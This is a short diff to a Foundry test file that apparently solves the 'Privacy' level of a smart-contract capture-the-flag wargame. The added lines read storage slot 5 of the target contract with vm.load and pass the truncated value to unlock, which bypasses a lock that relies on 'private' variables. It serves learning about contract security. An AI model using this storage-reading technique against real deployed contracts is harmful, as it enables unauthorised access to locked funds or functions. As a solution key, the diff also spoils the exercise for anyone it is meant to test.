@@ -17,5 +17,9 @@ contract PrivacyLevel is SetUpLevelTest {
         privacy = Privacy(instance);
 
         /** CODE YOUR SOLUTION HERE */
+        vm.startPrank(player);
+        bytes32 key = vm.load(address(privacy), bytes32(uint256(5)));
+        privacy.unlock(bytes16(key));
+        vm.stopPrank();
     }
 }
